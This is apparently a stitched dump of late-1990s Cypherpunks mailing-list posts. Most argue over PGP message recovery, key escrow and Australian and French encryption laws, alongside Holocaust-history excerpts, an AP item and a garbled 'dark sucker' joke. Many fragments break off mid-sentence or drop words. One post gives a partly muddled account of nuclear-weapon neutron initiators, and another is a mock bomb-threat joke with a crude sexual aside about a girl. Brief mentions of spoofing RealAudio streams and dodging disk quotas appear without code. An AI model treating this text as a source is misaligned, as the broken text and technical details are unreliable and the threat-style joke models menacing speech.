expendable to the war effort.[47] Only after the war was it confirmed
that a rescue operation to the Nazi concentration camps could have
been successful.  'Marshal of the RAF Sir Arthur `Bomber` Harris
declared afterwards that a rescue plan was `perfectly feasible, but I
was never asked to undertake it.`'[48]
  "No one campaigned to rescue the Jews because the leaders of the
Western nations had deliberately withheld the truth about the
Holocaust from their own citizens.  After verification by each of the
Allied intelligence services, the body counts of murdered Jews were
quietly classified as early as September 1941."
Pages 70-71:
  "Ibn Saud had no intention of ever letting a single Jew emigrate to
Palestine.  President Roosevelt discovered this for himself, but too
  "In February 1945, just before he died, President Roosevelt
personally met Ibn Saud.  He attempted to enlist the king's support
for the Zionist solution, but Ibn Saud firmly rejected the idea,
instead suggesting that the Allies should give 'them and their
descendants the choicest lands and homes of the Germans who oppressed
them' or that the Allied countries take in the Jews themselves.[57]
  "The king's vehement opposition to Jewish migration was a bit of a
shock to Roosevelt, who was strongly sympathetic to the Zionist cause.
Yet none of the Western nations was ever prepared to take more than a
handful of Holocaust survivors.  As one book showed, the Canadian
policy was 'none is too many.'  The king seemed to recognize this, and
he reminded Roosevelt that Palestine had already taken 'its fair share
of refugees from Europe.'
  "Suddenly the president's sympathy for the Jews was wavering.  He
told Ibn Saud that 'he would do nothing to assist the Jews against the
Arabs and would make no move hostile to the Arab people.'  Roosevelt's
new policy was to be netural, but neutral in favor of the Arabs.[58]
It was an uncomfortable lesson for the ailing president.  The choice
seemed clear enough.  The United States could help the Jews found
their home in Palestine, or it could have Saudi Arabia's oil as the
engine room for postwar dominance.  It seemed to Roosevelt that could
not have both.  He chose oil."

     ELIZABETHTOWN, Pennsylvania (AP) -- Armed FBI trainees in
     bulletproof vests and camouflage surrounded a group of teen-agers,
     handcuffed them and forced them to the ground before realizing they
     had the wrong people.
     The trainees were taking part in a training exercise at a town
     square Wednesday night in which they were apparently supposed to
     nab others taking part in the drill.
     Instead, up to 30 FBI trainees jumped out of a caravan of vehicles
     and descended on the innocent teen-agers, bound their wrists with
     plastic ties and ordered them to lie face-down on the sidewalk.
     After about 30 minutes, the agents set the teens free.
     The FBI would not comment on the specifics of the drill, but an FBI
     official apologized Friday and two agents visited the home of one
     of the youths Thursday night to express their regrets.

@_subject: Transmission Management 
(This feature is independent of the GAK aspects of the product.)
It's probably a good idea to set up your mailer so that it discourages
transmission of unencrypted mail.  This could be as simple as a
sequence of questions: "Do you want to do this?", "Do you really want
to do this?", and "Are you absolutely one hundred percent sure that it
is a good idea to put this message on tape at Fort Meade for
eternity?"  But, you could make more amusing warnings.  For example,
the mailer could convert your message into a front page article for
the New York Times and show you what it will look like.
Agencies which handle encrypted communications typically track every
message sent.  We should do the same thing.  Most people probably do
this in an informal way, but really slick tools for doing this would
have their uses.
This is especially true when managing an identity.  Not only would it
be nice to track every transmission in a nice easy to assess way, but
also track exactly how it was transmitted, the precise time of
transmission, and the remailers used to deliver it.
This raw information would be neat to have, but it wouldn't get really
useful without an analysis tool.  For instance, you could see how much
your identity depends on the security of certain remailers.  If you
use one remailer in your chains a lot, you might want to have
something which warns you that you are becoming overly dependent on
that remailer.  Or, you might want to run "what if" scenarios to see
if you would be vulnerable if a particular set of remailers were
If the analysis tool were really good, it would hunt for weaknesses
based on known remailer attacks.
And, naturally, for proper identity management it would be important

@_subject: Thanks Peter! / Re: russia_1.html 
I lost your email address when I spilled Scotch on my computer and
lost all my data, so I thought I'd send this to the CypherPunks list.
 Thanks for explaining to me how to decide where the 'yellow' wire
goes. My 'you know what' ought to work now (but I'm not going to
try it at home, kids...heh...heh).
  I'm going to go to Washington as soon as I get my cast off. I left
in on an extra week since I make more money spare-changing since I
got it, and now I have enough to take a bus to 'you know where,' DC.
  Tell Declan that he should probably go visit his mom, or something,
like next Friday, until at least Monday (because that's when my mom
leaves Washington, 'you know where.'--{boy, is *she* going to be
sorry she grounded me on my uncle's weekend away from the 'Home'.})
  My uncle's going to be mad when he finds out I took his suitcase,
but he couldn't even get his Heathkit radio to work, and I *almost*
did. Besides, you should never trust anyone over fifteen, eh?
(And these things are dangerous in the wrong hands, eh?)
Human Gus-Peter
p.s. - Cynthia still hasn't answered me as whether or not she is
  wearing any panties. Is she stuck-up, or something?
p.p.s. - I wonder if Dimitri thinks its suspicious that your first
  name is the same as my last one. Of course, if he thought we were
  doing what John-John do, then ? the Playpus would call you a
  pedal-file, eh? (Unless you were doing it to a girl my age, and
  then he would call you a 'petal-file.') {<-- that's a sexist joke}

@_subject: access to storage keys, NOT comms keys! 
Here is what leading cryptographers say about email key recovery, from
  This includes respected
figures like Bruce Schneier, Matt Blaze, Ron Rivest, Ross Anderson,
Whit Diffie, and more.
   2.1 Communication Traffic vs. Stored Data
   While key ``recoverability'' is a potentially important added-value
   feature in certain stored data systems, in other applications of
   cryptography there is little or no user demand for this feature. In
   particular, there is hardly ever a reason for an encryption user to want
   to recover the key used to protect a communication session such as a
   telephone call, FAX transmission, or Internet link. If such a key is lost,
   corrupted, or otherwise becomes unavailable, the problem can be detected
   immediately and a new key negotiated. There is also no reason to trust
   another party with such a key. Key recoverability, to the extent it has
   a private-sector application at all, is useful only for the keys used
   to protect irreproducible stored data. There is basically no business
   model for other uses, as discussed below.
   In stored data applications, key recovery is only one of a number of
   options for assuring the continued availability of business-critical
   information. These options include sharing the knowledge of keys
   among several individuals (possibly using secret-sharing techniques),
   obtaining keys from a local key registry that maintains backup copies,
   careful backup management of the plaintext of stored encrypted data, or,
   of course, some kind of key recovery mechanism. The best option among
   these choices depends on the particular application and user.
   Encrypted electronic mail is an interesting special case, in that it
   has the characteristics of both communication and storage. Whether key
   recovery is useful to the user of a secure E-mail system depends on
   design of the particular system.
   The government, on the other hand, proposes a key recovery infrastructure
   that applies to virtually all cryptographic keys, including (especially)
   those used to protect communications sessions.
They say that key recovery is not appropriate for transient keys used
during a communication session.  However, email is a special case, having
characteristics of both communication and storage.  In some systems,
email may be archived for long periods of time in the same format that
it was received.  For such systems there is a business case for key
recovery in email.

The pit usually contains beryllium-9 and an alpha source.  When beryllium-9
is struck by an alpha particle it will eject a neutron.  Tritium is rather
useless for this purpose as it is a beta emitter and betas do not have
enough energy to eject neutrons from anything.  The reason the pit goes bad
is because you need to be able to produce a large number of neutrons in a
short period of time, so you need a very strong alpha emitter (stronger
than the Pu239) which means it will decay more rapidly.  Furthermore, those
neutrons are going to find their way into various nuclei and transmutate
them into things you don't want.
The reason the pit is necessary is that Pu is too fast - the critical
mass will blow itself apart just as the reaction is getting underway.  To
avoid this "fizzle", an implosion bomb is used which squeezes the Pu core
and holds it there long enough for it to react.  Once the critical mass
is assembled you want to make sure it actually blows.  If there aren't any
free neutrons during that split-second then it won't explode.  So that's
what the 'pit' is for.

Interesting. The "Crow" algorithm seems to do nothing but return "BITE

into hip neologisms, and the "Gypsy" algorithm turns unintelligible
plaintext into unintelligible ciphertext and vice versa.

The Government routinely lies to the citizens it allegedly represents.
It infringes on the rights guaranteed those citizens by the Constitution.
The FCC can't allocate radio bandwidth efficiently, byt they seem to have
no problem telling Howard Stern not to say "vagina" on the radio. I could
go on and on, ad nauseam, but you get the idea.
If this is their best effort, they should be horsewhipped, tarred, feathered, and run out of town on a rail. Unfortunately, the brain-dead
populace continues to get hypnotized by their Pied-Piper tales and
makes the biennial Bataan death march to the polls (nice double
entendre there, n'est-ce pas?) to choose between Picto Bold and Picto
Light, the two candidates in their district who have a single common
goal: to get elected to an office where they can get a firm lip clamp
on the teat of the American taxpayer, and skim off the lobbyists in
their spare time. Neither one really gives a flying fuck about the
people they represent; it's the power they want.
Why would I want to do anything for the Government? I already pay them
a tithe (oh, sure, you can call it "income tax") to stay the fuck away
from me, by and large. As soon as someone shows up at my door and says "Hi, I'm here from the
Government to help you," I'm running for my life. That kind of "help"
usually results in gunfire, or dependence on further Government subidies,
or having mopey Government types hang around to explain to me that I should
use water-based varnish so I don't wreck the ozone layer.
None of us need your pity. And wipe your chin when you're done. And say
"hi" to Mr. Freeh next time you see him. Of course, it won't be his
face that'll be at eye level. . .

@_subject: Object code disassembly (was Re: [LONG, off-topic]] Interactive Programming) 
Not quite that easy.
Awhile back I disassembled RealAudio because I was curious how their codec
worked.  Turns out it was not all that interesting and the codecs in
nautilus and speak freely are probably better.  But anyway....
Running objdump on the binary spit out ~800000 lines of code.  They
statically linked the whole thing, motif, c library, and all.  I'm not
sure what they compiled it with, the c-library they had in there didn't
look like any of the standard ones.
It disassembled fine, but 800k lines of assembler dump is not really all
that readable.  So I ended up doing it interactively, setting breakpoints
on the I/O operations and backtracing to find the coder.  The user
interface code tended to get in the way a lot.
The 1kb/s coder is very basic.  No predictor/corrector, and no redundancy
(eg lempel-ziv, rle) compression at all.  It's just a frequency/band coder
at 10 frames per second.  I guess thats so it can handle dropped frames.
No checksums at all.
The "28.8" codec is more sophisticated.  It appears to be a LPC and
compresses data into much larger blocks/packets.  I didn't look into it
too deeply because there are lots of other lpc coders available.
Shortly after this, they put out a new version 3.0, with yet another
codec, which I never looked at.  This was quite awhile ago, and all this
is from memory.
So the codec was rather uninteresting, but there were a number of other
"features" which got my attention.
I looked at the network protocol.  Its pretty simple.  The client connects
to the server and requests the file it wants.  It also sends a whole
bunch of other info, like host operating system, version number, etc.
("for statistical purposes, right?  uh huh..."  are you guys over there
at anonymizer.com reading this?  hint, hint.)
Then it does something truly bizarre.
The client and server exchange 32-digit hex numbers.  The client calls
gettimeofday() and gethostname() and uses this as a random seed.  Then
it sends a 128-bit random number, encoded as 32 ascii hex digits.  The
server does the same.
I haven't a clue what this is for.  Considering that the other data
structures are all binary, sending this as ascii is really dumb.  It looks
as though its part of some third-party library.  I thought maybe it was
some variant of netscape cookies but it doesn't save anything to disk. It's just wierd.  I tried stepping through this section of code a few
times, but doing so usually caused the server to time-out.
Then the server starts sending the audio file as one big stream of
packets - same format as the files it saves to disk, just broken up into
packets, each preceeded by a length byte.  In udp mode the client sends
acks every second or so.  In tcp mode there are no in-band acks at all,
it relies solely on the tcp protocol driver.  No checksums on anything,
and it uses predictable port numbers.  You can probably spoof it real
easy.  That might make for an interesting prank.

A little confused here.  Let's call the older man "Victor" and his
fifteen year old friend "Harold".  Neither of them were murdered,
right?  Let's call the murder victim "Norbert".
"Harold" refused to rat out "Victor" and now the police are charging
"Harold" with the murder of "Norbert".
What is the relationship between "Harold" and "Norbert"?  You say
there is no direct evidence connecting them.  What evidence does
connect them?  Did they at least know each other?
While "Harold" may not be guilty of the murder, if he did kill
"Norbert" then he should probably be treated as a murderer.  While the
police should not harrass gays, such harrassment does not seem to make
a good excuse for murdering an unrelated completely innocent third

Euphemism alert: when we are talking about the kind of data recovery
we like, we call it "backup".  When we are talking about the kind we
don't like, we call it "escrow".  Schneier did the same thing:
Bruce Schneier:
You don't actually mean that you should backup storage keys, you mean you
should provide a means for someone other than the user to decrypt that
stored data.  Schneier means the same thing with regard to "data backup".
This could be a good idea, particularly in terms of old keys leaking
out, but it needs more work.  It's not clear that any of the forward
secrecy methods will work for email.  You can't easily do a DH key
exchange via email because of the multiple messages.  Maybe you could
piggyback on ordinary messages, and after a few have been exchanged,
you can get a DH key for the next message, but this is very complicated.
Synchronization isn't guaranteed with email, neither is reliable delivery.
This is also a good idea, but it needs more work, too.  There is a big
education problem here.  People barely understand the implications of
regular digital signatures.  Now you are throwing this new kind in, which
guarantee the message came from another person, but aren't binding.  What
happens when an employee receives a message from a supplier signed with
that kind of signature?  Can he make a decision on that basis, or not?
In paper business correspondence, there is no such distinction.  A signed
letter is transferable.  Go beyond this and business will be scratching its
heads.  It's a solution looking for a problem.
There may be patents on these technologies, too.
This is going to require special archival software and special actions on
the part of users.  You won't be able to do it as a transparent plugin.
The user can't save his mail the regular way (with some email packages),
he has to remember to (also?) save it to the business access archive.
If he forgets, the business owner has lost access.  There will be
extra training costs, and people will have to change their habits.
Besides being more complex to design and implement, it will be harder
to sell to customers.

Sometimes you can use this trick to get around storage limitations at

disk quota.  When you hit your limit, just e-mail yourself a bunch of
megabyte messages.  Sysadmins tend not to like this.

@_subject: CAK as a really bad form of corporate networking 
One should also ask who is managing the company and why.  It is never
a good policy to leave important components of the company in the
hands of particular people for long periods of time.  While people die
relatively infrequently, they do often become frustrated or angry and
leave the company.
For instance, one really has to ask what is going on when a programmer
doesn't check in his or her code for six months.  And one really has
to wonder how useful that code is going to be to anyone.
My policy has been to discard half completed work when people leave.
It's just cheaper to start anew than to clean up and debug
undocumented code which nobody understands.
In general, the case where "important documents" have to be retrieved
from a departed employee's desk or computer are fairly uncommon.  And
the case where it is necessary to intercept a departed employee's
e-mail is pretty much non-existent.
I am looking forward to hearing the precise mechanisms behind PGP,
Inc.'s change in tune.  Were some of those investors shills?  In terms
of governmental expenditures, it would cost nothing to flood PGP with
great investment deals.  It would probably cost less than Clipper
itself.  And all of the former troublemakers can be quietly ridden
down and finally trained to accept the saddle of good stock deals and
contractual obligations.  If that was the mechanism, it's pretty slick
and to be admired by sportsmen everywhere.
It is the sense of Monty Cantsin that a number of readers of the list
are downplaying PGP Inc.'s actions because they hold the character of
certain people involved with the company in high regard.  This is
probably an error.  Character must be judged by actions.  The actions
are clear.

FILED: May 3 , 1994
ABSTRACT:   Cryptographic methods and apparatus for forming (102) and
verifying (103) private signatures and proofs (203,204, 207, and 209)
are disclosed. Such a signature convinces the intended recipient that it
is a valid undeniable or designated-confirmer signature. And such a proof
convinces the intended recipient, just as any cryptographic proof. Even
though the signatures and proofs are convincing to the intended recipient,
they are not convincing to others who may obtain them. Unlike previously
known techniques for convincing without transferring the ability to
convince others, those disclosed here do not require interaction--a
signature or proof can simply be sent as a single message. Because
the intended recipient can forge the signatures and proofs, they are
not convincing to others; but since only the intended recipient can
forge them, they are convincing to the intended recipient. Exemplary
embodiments use a cryptographic challenge value that is said to pivot on
a trap-door function, in that the value can be manipulated by those with
the corresponding trap-door information, and is believed impractical to
manipulate without it.

@_subject: Auto-archiving cleartext is GAK 
Advocates of the model where software is automatically archived on
receipt, either in cleartext or re-encrypted with a corporate key,
need to be aware that there are problems with it:
No notification to sender about the policy.
Imagine encrypting this mail to your friend sue at microsoft.com: "Hey Sue -
it's been a while.  Is your boss still being such a wiener?  That was a
great imitation you did of the jerk at the party last month.  He still
doesn't know you're shopping your resume around, right?  What a luser."
You might have thought you had a certain level of privacy when you
encrypted it to your friend's personal key, but you didn't.  This is going
to cause embarrassment and misunderstandings.  People should know if their
mail is going to be automatically saved in the clear to a company archive.
The best way to make sure of that is to have the sender be the one to do
it, or not.
No way to prevent third-party access.
With the corporate message recovery feature, the sender has the
option of simply ignoring the recovery key and sending it encrypted just
to the recipient.  Some corporations won't let it through, others will.
Some companies will want mail to be made recoverable by default, while
still allowing an escape clause for personal mail and special purposes
(like for "sensitive" mail which needs protection against subpoena
and discovery).  They can use the "optional" CMR mode.  Again, senders
are always notified as to which mode is being used by a given company,
and senders can be confident that if they don't use the third-party key,
no access will be possible.  With automatic encryption and archival on
receipt, all mail will be archived, and senders have no notice and no
guarantee that stated policies will be followed.
No escape via super-encryption.
Even if the company is mandating a recovery key and filtering out
messages which aren't encrypted to it, the sender still has the option to
super-encrypt with the recipient key alone, before sending the message
encrypted to the corporate recovery key.  This ensures that only the
recipient's personal key can read the message.  With software which
automatically saves the cleartext of the message, once the user reads
the data it is available to the corporation via the snoopware.
Facilitates GAK!
Suppose this solution is adopted, and software is developed which
automatically re-encrypts received email and sends it to a secure archive.
It's robust and works with a wide variety of email packages.  Now the
government could simply mandate this to be used for all mail reading
software.  The secure archive would be a remote archive maintained by
the FBI to protect public safety.  All plaintext would be sent there,
encrypted by the FBI key.  The business software would already support
this.  This is GAKware!  Unlike with a CMR system, the sender would
have no way to prevent access.
Can't handle forgotten passphrases.
People forget passphrases all the time.  With re-encryption on receipt,
there is no way to recover gracefully from this error.  All the incoming
encrypted data is lost until you can notify everyone who has sent mail to
resend it, and get your new key out to all of them.  These may be purchase
orders, sales leads and other important documents which represent lost
business if they can't be recovered.  This is going to invite people to
use poor security practices like writing down passphrases or choosing
ones which are easy to guess.  Worse, it...
Invites key escrow.
In order to prevent this problem, employees may be forced to share
their secret keys with corporate management.  Software will be written
to facilitate this process.  Crypto companies are already doing this.
Nortel Entrust allows key generation by management, where employees
are given the keys and management keeps a copy.  Shades of Clipper!
This also fails the notification requirement.  Don't believe me?  Take a
look at this description of the Nortel Entrust product:
No system is ideal.
Before pushing this re-encryption model as a panacea, think about the
implications.  No system which provides automatic access to business data
is going to be privacy friendly.  Any such system can be perverted into
supporting GAK.  Load it up with all the disclaimers you like, but if
you advocate software which contains key escrow and which automatically
provides cleartext to third parties, you are not advocating software
which protects privacy.  Be prepared to be called an advocate of GAK next
time you push for software which automatically archives cleartext, because
if it can save it for business, it can save it for government.

A couple of ISPs in messages under the "Interception" heading have

OzEmail, Access One, Connect.com.au and Magna Data are only the largest

It's going to take more than an a packet sniffer to decrypt secure
messages going through your network. If you're preparing a VPN trial
with something like Data Fellows' F-Secure VPN software, which doesn't
allow for key recovery, then you're up the proverbial creek as regards
your obligations under this new law. You'll have to keep an extra key
for the Feds, ASIO, NCA etc, and only use cryptography software that
includes key recovery.
You'll also have to be involved in a lengthy approval process with the
Attorney-General's department and the ACA, which is dangerously
open-ended. The system will be that you have to submit your plans for
new secure network products every year, and the law enforcement agencies
have a set amount of time to protest that they can't access it. This
process will add three months, at minimum IMHO, to the development of
new services.

Brief Background: In the last two months Australia (at this time under
a so called conservative Liberal Government) has re-affirmed its
anti-market controlled economy approach to economics with the
establishment of an IT bureaucracy, forcing ISP's to 'join' the TIO
and fund its operations, establishing the framework for a possible
cencorship regime on the internet, proposed legislation for key
escrow wrt VPN's and pursuing its favoured entrail reading approach to
economics by yet again believing it can 'pick winners' in the market
and allocate resources more efficiently than the market can; an
approach any socialist or totalitarian would be proud to support.
There is very little organised effort to oppose these measures. I
expect that people elsewhere will soon be able to look to Australia as
a testing ground for all the worst case scenarios long discussed on
Now the State has announced it's intention to forcefully mandate
authentication on the internet by imposing yet another taxpayer funded
bureaucracy and to hell with the market solutions already provided at
no cost to citizens. Shame on you Australia.
(Are politicians genetically selected on their ability to make
precisely the wrong decision in any given circumstance? Actually wrt
authentication there is no problem to solve. Doing nothing was the
best thing to do. Of course what this is really about is limiting
entry to markets, corruption and fraud on the public.)

little use if customers and businesses cannot identify each other on
the Net.
Federal Cabinet yesterday approved steps to create a national system
for online authentication.
The Government will establish a body to oversee all authentication
systems.  The Communications Minister, Senator Richard Alston, said
this would significantly boost electronic commerce.
"With predictions that electronic commerce in Australia will increase
more than four-fold to $6.3 billion by 2001, the Government is well
aware that development of trust and confidence by businesses and
consumers in the reliability and security of online transactions will
be critical to the development of the information economy," he said.
A group of industry and government experts will report by March next
year on possible functions and powers of the watchdog. This will
include determining the technical standards required before an
identification system obtains certification. Several corporations have
marketed safety systems to exploit concern about the safety of online
Sophisticated encryption will also be necessary before certification
is granted.

possible, while law enforcement bodies have sought access to records

I thought that was the whole point of the PGP design.  It makes the
presence of third parties clear and visible to all participants.  This
seems to be the fundamental principle.  PGP is designed to allow Alice
and Bob to be informed if third party access is built in.  Key escrow
and re-encryption are inherently less visible forms of message access.

Let's look a little closer at the kinds of access and notice available in
the PGP system compared to alternatives.
As several people have pointed out, no encryption system can provide
protection against what is done with the message after it is decrypted.
The receiver could share it with whoever he wants to, or whoever he is
forced to.
Consider the following scenarios:
 - An encrypted message is sent to someone at his workplace using current
   systems like PGP 2.6.
 - An encrypted message is sent to someone at his workplace, who is using the
   message access features of PGP 5.5.  The corporation key is marked as
   "optional", and the message is not encrypted to that extra key.
 - An encrypted message is sent as before, but this time the message is
   encrypted to the corporate key.
 - An encrypted message is sent to someone at his workplace, who is using
   a different form of corporate access which relies on key escrow
   or automatic acquisition of cleartext.
We agree that none of these systems can provide complete protection
against third party access.  In any of them, the receiver could be forced
to turn over the encrypted message.  But there is still a difference.
In the first two scenarios, the expectation of privacy is the same.
You are encrypting to a personal key at a business address, but you
expect that you would know about it if the data were being provided to
a third party.  There is no widespread installed base of software which
provides secret access after the message is decrypted.
In fact, the second scenario arguably provides slightly more privacy
than the first, which is what we have now.  The reason is that in the
second scenario, the company provides an optional mechanism for business
mail to be recoverable, but also provides an explicit, sender-controlled
escape clause.  The company is granting an explicit expectation of privacy
by allowing the corporate key recipient to be removed.  With usage of
older versions of PGP, there was really no way for the company to even
inform the sender about whether it was going to be reading the mail.
In the third scenario, where you encrypt to the corporate key, there is
no expectation of privacy.  All parties, the sender, the receiver, and
the company, know that the data is being made available to the business.
There is not much privacy here; what you have is business security.  This
mode would be used for business documents and business communications.
In the fourth scenario, which some people are offering as a superior
approach, the expectation of privacy is much less clear.  Unlike in the
current PGP approach, where the design of the corporate access system
is oriented around notifying the sender and receiver, a key escrow or
plaintext recovery system inherently provides no such notice.
This is different from the status quo.  We are talking about a commercial
product which provides automatic corporate access to communications.
Widespread installation and use of this alternate version of PGP
inherently changes the assumptions and expectations that you will have
when you encrypt to someone at work.  Given the company's desire for
message access, this approach implies that you must conservatively assume
that most encryption to a business address will be read.
The PGP system is designed to avoid this.  It provides another method
for corporate access, a visible and explicit method.  It is intended as
an alternative to key escrow and other systems which recovery data after
the recipient gets it.  PGP's third party recipient feature is designed
to prevent the creation of an installed base of escrowed keys and after
the fact third party access software.
Even if the encryption system provides a way for the user to mark his
keys as being escrowed or otherwise providing third party access,
the system is not self-correcting in the way the PGP system is.
It would be much easier for a business owner to pervert a secretive
access system than one like PGP.  The company could install the access
features but not tell its employees that their keys were being escrowed,
or that their mail client was secretly storing a copy of all plaintexts.
This kind of change would be easy to make with the after-the-fact access
systems some people are proposing.  Yes, theoretically this can be done
with any encryption system (as all agree) but the point is to avoid the
widespread distribution of software which invites this kind of abuse.
The PGP system is designed to satisfy business needs without leading us
into this dangerous situation.
A world in which third party encryption by the sender is the normal and
widespread method for corporate access is one with increased privacy and
more visibility of access.  The alternatives which have been proposed are
prone to abuse and provide less visibility.  They lead us towards a world
in which there is no expectation of privacy even for encrypted messages,
by providing an installed base of snooping software.  The PGP approach
is explicitly designed to keep us out of that world, by removing the need
for that kind of software.

Wall Street Journal, October 20, 1997:
   French Proposal For Encryption Is Worrying EC    By Jennifer L. Schenker
   A proposed French law ensuring government access to
   corporate electronic communications is setting off alarm
   bells in the business community and on the European
   Commission.
   France, presenting the law as a liberalization of its
   current policy, is the only Western country that bans any
   domestic use of cryptography - technology that encodes data
   for protection against prying eyes. France also places
   strict controls on the export of encryption tools, a
   restriction imposed by certain other countries, including
   the U.S.
   The new rules, submitted to the European Commission on
   Thursday, allow businesses operating in France to encode
   their corporate secrets but require that keys to unlock the
   code be given to a French government-approved entity in
   which the majority of the capital or votes is retained by
   French nationals.
   Microsoft Corp., Netscape Communications Corp. and the
   Business Software Association have raised objections to the
   French proposal. The BSA represents major international
   software publishers and high-tech companies, including
   Novell Inc., Compaq Computer Corp., Apple Computer Inc. and
   Lotus, a unit of International Business Machines Corp. The
   proposal also requires companies selling products with
   embedded encryption software in France to reveal "source
   code" - the rough equivalent of asking Coke to reveal its
   secret formula. Some believe that such a key-recovery
   system would make it easier for competitors to gain access
   to a company's secrets.
   The BSA's European chapter is expected to release a public
   statement this week supporting the European Commission's
   decision earlier this month to reject the key-recovery
   approach to encryption, which is championed by both the
   U.S. and France.
   The commission, which will formally comment on the French
   proposal by month's end, is concerned partly because the
   French ownership requirements may violate internal market
   rules.
   "I do not say this is the best system. It is the least bad
   in trying to find a balance between national-security
   interests, economic interests and the protection of
   personal privacy," said Gen. Jean-Louis Desvegnes, chief of
   France's Central Service for the Security of Information
   Systems, a civilian agency that reports directly to the
   French prime minister's office. He indicated that France
   might be flexible on the ownership requirements.

@_subject: Dark is faster than Light 
Bell Labs Proves Existence of Dark Suckers
     For years it has been believed that electric bulbs emitted light.
However, recent information from Bell Labs has proven otherwise. bulbs don't emit light, they suck dark.  Thus they now call these bulbs
dark suckers.  The dark sucker theory, according to a Bell Labs
spokesperson, proves the existence of dark, that dark has mass heavier
that of light, and that dark is faster than light.
     The basis of the dark sucker theory is that electric bulbs suck
Take for example, the dark suckers in the room where you are.  There is
less dark right next to them than there is elsewhere.  The larger the
sucker, the greater its capacity to suck dark.  Dark suckers in a
lot have a much greater capacity than the ones in this room.  As with
things, dark suckers don't last forever.  Once they are full of dark,
can no longer suck.  This is proven by the black spot on a full dark
sucker.  A candle is a primitive dark sucker.  A new candle has a white
wick.  You will notice that after the first use, the wick turns black,
representing all the dark which has been sucked into it.  If you hold a
pencil next to the wick of an operating candle, the tip will turn black
because it got in the path of the dark flowing into the candle.
     Unfortunately, these primitive dark suckers have a very limited
There are also portable dark suckers.  The bulbs in these can't handle
of the dark by themselves, and must be aided by a dark storage unit. the dark storage unit is full, it must be either emptied or replaced
the portable dark sucker can operate again.
     Dark has mass.  When dark goes into a dark sucker, friction from
mass generates heat.  Thus it is not wise to touch an operating dark
sucker.  Candles present a special problem, as the dark must travel in
solid wick instead of through glass.  This generates a great amount of
heat.  Thus it can be very dangerous to touch an operating candle.  Dark
also heavier than light.  If you swim deeper and deeper, you notice it
slowly darker and darker.  When you reach a depth of approximately fifty
feet, you are in total darkness.  This is because the heavier dark sinks
the bottom of the lake and the lighter light floats to the top.  The
immense power of dark can be utilized to mans advantage.  We can collect
the dark that has settled to the bottom of lakes and push it through
turbines, which generate electricity and help push it to the ocean where
may be safely stored.  Prior to turbines, it was much more difficult to
dark from the rivers and lakes to the ocean.  The Indians recognized
problem, and tried to solve it.  When on a river in a canoe travelling
the same direction as the flow of the dark, they paddled slowly, so as
to stop the flow of dark, but when they traveled against the flow of
they paddled quickly so as to help push the dark along its way.
     Finally, we must prove that dark is faster than light.  If you were
stand in an illuminated room in front of a closed, dark closet, then
open the closet door, you would see the light slowly enter the closet,
since the dark is so fast, you would not be able to see the dark leave
     In conclusion, Bell Labs stated that dark suckers make all our
much easier.  So the next time you look at an electric bulb remember
it is indeed a dark sucker.

Mark, just remove the self signature on the user key.  The message
recovery key packet goes away!  That's all you have to do.  Is that
so tough?  This big threat, the dangerous CMR key, turns out to take
two seconds of user actions to be destroyed.  Something this easy to
turn off will never be good enough for GAK.
People say, "Oh, but then the government will make everybody run the
policy enforcer and reject any mail not encryped to the government."
First, if they were going to do this, they could do it with old versions
of PGP too.  Multiple recipients have been around practically forever.
Second, it's a ridiculous idea which ignores how email works.  More and
more people are running systems at home which could send and receive
SMTP mail.  The trend is towards home servers which support the multiple
home computers people will have in the next decade.  There's no way to
make those people run filters!
People say, "Oh, but they'll make it illegal to receive mail at home
without going through an ISP."  I'm serious, this has actually been
suggested on this list.  It has to be suggested, because it's the only
way this incredibly stupid scenario could be made to work.  I can only
assume that people are blinded by emotions or they wouldn't suggest such
a bizarre idea.
Making it illegal to implement probably the most widely used internet
protocol package (email) would be a totally unprecedented, invasive,
unjustifiable and unenforcable intervention by government.  If the only
way the government can enforce GAK is by making it illegal for people to
receive email through paths which don't pass through government filters
we can all rest easy, because it will never happen.
Even for the cases where filtering is done (like businesses), there are
easy countermeasures, described by no other than Jon Callas, PGP's chief
scientist!  Why would he say this if there were a massive conspiracy to
enable GAK?  He's also the one who explained the point above about the
self signature.  He has suggested two other easy workarounds:
Modify the PGP 5.0 source to put a fake recipient block on it.  How many
companies release their source so that you could do this?
Or superencrypt to the real end user, like you suggested in your scheme.
Why is this OK as a privacy workaround for your idea but it doesn't
count for PGP?
Then people say, "Oh, but PGP shouldn't have written the SMTP filter
anyway (or at least they shouldn't have put that one policy in) because
it would make it easier for the government to make everybody use it."
Ignoring all the considerations above about what a stupid idea this is,
the fact is that a simple filter like this is incredibly easy to write.
I'm sure a skilled Perl hacker like Adam Back could put together something
to check that a PGP message is encrypted to a desired key in a few hours.
There are already Perl scripts out there to help parse PGP messages.  You
just have to look at the recipients and compare with the key you want to
The existence of such a filter is totally insignificant in the big
picture.  If we are ever forced into a GAK system and filtering turns
out to be a part of the picture, it will be trivial for such filters to
be created.  PGP's SMTP product will not make any difference one way or
the other.
The fact is, nobody has come up with a scenario where PGP's CMR feature
can be turned into GAK in any practical way.  They have to assume that all
kinds of changes and additions are made - inability to remove CMR keys,
forcing everyone to run SMTP filters, making it illegal to receive email
at home, preventing people from implementing clients with workarounds,
changing the technology to make it harder to implement workarounds
using binding cryptography.  Any system can be turned into GAK if you're
allowed to postulate these kinds of changes.  And the fact is that every
GAK system so far designed can be trivially defeated.
The big GAK danger has always been that the encryption manufacturers
would release GAK-only versions of their software, so that you have a
choice between an easy to use system with GAK support, or a difficult
and balky product like PGP 2.6.2, distributed via underground means and
with GAK workarounds.  Now at last you can be sure that even if the very
worst happens, you will at least have the convenience and ease of use of
PGP 5.0 as the GAK disabled product, via a non-GAK international version.
This doesn't have anything to do with PGP's policies or motives; it is
strictly because of PGP 5.0's source distribution, which will make it
easy for cypherpunks to modify it to look compliant with GAK while using
superencryption or some other technology to avoid it.
No longer will it be a choice between convenient GAK or clumsy non-GAK,
opening the latter option only to cypherpunks and hackers.  Now people
opposed to GAK will be guaranteed an option of making their software at
least as easy to use as PGP 5.0.  If source code becomes available for
PGP 5.5, that will raise the guaranteed ease of use of non-GAK software
even further (by all accounts, 5.5 has an even better interface than 5.0).
The existence of these products in source code form will forever stand
as a barrier to any hope to coax (most) people into using GAK software
by forcing it into built-in products, leaving the alternative of non-GAK
software only to a tiny minority.  This in itself should monkey wrench
any government plans for requiring GAK.

It sounds like everybody is in agreement, then.  Companies have the
right to ask their employees to give up some privacy, time, and
effort.  You are arguing that many employees will opt to give up their
privacy rights because that choice is preferable to the others they
perceive.  Because there is a large number of such people, it is
likely that large numbers of people will become accustomed to giving
up their privacy and will be sympathetic when other people are forced
to give up their privacy.
Where there may be some disagreement is whether the solution is to
pass even more laws that restrict what choices people may make
